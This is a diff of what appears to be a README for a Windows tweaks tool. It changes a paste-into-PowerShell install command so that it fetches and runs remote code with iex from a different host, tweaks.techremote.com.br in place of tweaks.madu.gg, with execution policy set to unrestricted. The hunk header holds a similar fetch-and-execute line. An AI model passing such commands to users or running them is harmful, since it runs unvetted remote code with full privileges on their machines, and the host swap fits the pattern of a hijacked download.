@@ -284,7 +284,7 @@ powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://tweaks.
 ```
 if error then use the following!
 ```
-powershell -NoProfile -ExecutionPolicy unrestricted -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; &iex(New-Object Net.WebClient).DownloadString('http://tweaks.madu.gg')"
+powershell -NoProfile -ExecutionPolicy unrestricted -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; &iex(New-Object Net.WebClient).DownloadString('http://tweaks.techremote.com.br')"
 ```
 Or Run Powershell As Administrator and paste the following!
 ```
